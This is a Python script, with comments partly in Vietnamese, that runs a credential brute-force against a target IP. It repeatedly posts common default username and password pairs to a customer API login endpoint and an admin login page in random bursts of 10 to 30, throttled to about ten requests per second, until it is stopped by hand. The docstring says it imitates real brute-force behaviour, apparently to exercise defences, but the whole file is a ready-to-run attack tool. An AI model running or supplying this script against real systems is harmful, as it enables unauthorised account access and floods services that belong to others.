import requests
import random
import sys
import time

API_LOGIN = "/api/customers/login/"
ADMIN_LOGIN = "/admin/login/"

HEADERS = {
    "User-Agent": "BruteforceTester/Soft"
}

PAYLOADS = [
    {"username": "admin", "password": "123456"},
    {"username": "admin", "password": "admin"},
    {"username": "test", "password": "123"},
    {"username": "root", "password": "root"},
    {"username": "user", "password": "password"},
    {"username": "administrator", "password": "admin123"},
    {"username": "guest", "password": "guest"},
    {"username": "admin", "password": "password1"},
    {"username": "admin", "password": "letmein"},
    {"username": "user", "password": "qwerty"},
    {"username": "testuser", "password": "testpass"},
]


def soft_attack(base_url, rps=10):
    """
    rps = request/second
    Nhưng thay vì cố định mỗi vòng 2 request,
    ta sẽ gửi RANDOM 10 → 30 request mỗi vòng.
    Điều này tạo hành vi giống brute-force thực tế.
    """
    api_url = base_url + API_LOGIN
    admin_url = base_url + ADMIN_LOGIN

    session = requests.Session()

    print(f"\n=== SOFT BRUTEFORCE STARTED ===")
    print(f"Base URL: {base_url}")
    print(f"Target rate: ~{rps} requests/sec (ngẫu nhiên 10→30 per cycle)")
    print("Nhấn CTRL + C để dừng.\n")

    total = 0
    try:
        while True:
            # Random lượng request mỗi vòng
            burst = random.randint(10, 30)

            for _ in range(burst):
                payload = random.choice(PAYLOADS)

                try:
                    session.post(api_url, data=payload, headers=HEADERS, timeout=1)
                    session.post(admin_url, data=payload, headers=HEADERS, timeout=1)
                except:
                    pass

                total += 2

            # Tính time sleep để gần giống rps mục tiêu
            # Vì mỗi vòng gửi khoảng burst * 2 request
            sleep_time = max(0.01, burst / rps)
            time.sleep(sleep_time)

            if total % 50 == 0:
                print(f"[INFO] Sent {total} requests...")

    except KeyboardInterrupt:
        print("\n=== STOPPED BY USER ===")
        print(f"Tổng request đã gửi: {total}\n")


def main():
    if len(sys.argv) < 2:
        print("Usage: python bruteforce_soft.py <IP>")
        sys.exit(1)

    ip = sys.argv[1]
    base_url = f"http://{ip}"

    soft_attack(base_url, rps=10)


if __name__ == "__main__":
    main()
